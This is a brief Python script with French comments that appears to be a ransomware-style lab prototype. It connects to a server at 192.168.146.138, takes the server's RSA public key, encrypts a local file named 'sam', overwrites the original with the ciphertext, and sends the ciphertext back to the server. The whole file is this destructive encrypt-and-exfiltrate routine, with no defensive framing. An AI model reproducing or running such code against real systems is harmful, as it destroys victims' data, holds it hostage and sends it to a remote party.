import socket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

# Connexion au serveur
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('192.168.146.138', 5000))

# Réception de la clé publique du serveur
public_key_serialized = client_socket.recv(4096)
public_key = serialization.load_pem_public_key(public_key_serialized)

# Lecture du fichier à chiffrer
with open("/home/crypt_socket/sam", "rb") as file:
    file_data = file.read()

# Chiffrement du fichier
encrypted_data = public_key.encrypt(
    file_data,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Écraser le fichier original avec le fichier chiffré
with open("/home/crypt_socket/sam", "wb") as file:
    file.write(encrypted_data)

# Envoi des données chiffrées au serveur
client_socket.sendall(encrypted_data)

client_socket.close()
